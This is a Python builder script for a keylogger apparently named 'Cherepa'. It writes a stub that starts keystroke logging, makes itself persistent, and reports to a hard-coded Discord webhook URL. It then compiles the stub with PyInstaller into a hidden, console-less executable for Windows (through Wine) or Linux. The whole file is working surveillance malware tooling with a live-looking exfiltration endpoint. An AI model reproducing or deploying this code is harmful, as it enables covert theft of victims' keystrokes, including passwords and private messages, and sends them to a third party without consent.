import argparse
import subprocess
import os


WINDOWS_PYTHON_INTERPRETER_PATH = os.path.expanduser(r"C:\Users\Chris\AppData\Local\Programs\Python\Python310\Scripts\pyinstaller.exe")

def get_arguments():
    parser = argparse.ArgumentParser(description='Cherepa.exe se zavrushta')
    parser._optionals.title = "Optional Arguments"
    parser.add_argument("-i", "--interval", dest="interval", help="Secounds Between Reports", default=120)
    parser.add_argument("-w", "--windows", dest="windows", help="Windows executable", action='store_true')

    required_arguments = parser.add_argument_group('Required Arguments')
    required_arguments.add_argument("-wh", "--webhook", dest="webhook", help="webhook to send reports to.", default="https://discord.com/api/webhooks/921435574357876776/96Pbi7Ux8RzV6l7YMr3g5m_GI2R3ejRELNZCGafS2cNOcbTQ8_ZQkVrLfmgPKehIomAT")
    required_arguments.add_argument("-f", "--file", dest="out", help="File name.", required=True)
    return parser.parse_args()

def create_keylogger(file_name, interval, webhook):
    with open(file_name, "w+") as file:
        file.write("import keylogger\n")
        file.write("cherepa = keylogger.Kl(" + interval + ", '" + webhook + "')\n")
        file.write("cherepa.become_persistent()\n")
        file.write("cherepa.start()\n")

def compile_for_windows(file_name):
    subprocess.call(["wine", WINDOWS_PYTHON_INTERPRETER_PATH, "--onefile", "--noconsole", file_name])

def compile_for_linux(file_name):
    subprocess.call(["pyinstaller", "--onefile", "--noconsole", file_name])

arguments = get_arguments()
create_keylogger(arguments.out, arguments.interval, arguments.webhook)

if arguments.windows:
    try:
        compile_for_windows(arguments.out)
    except:
        compile_for_linux(arguments.out)
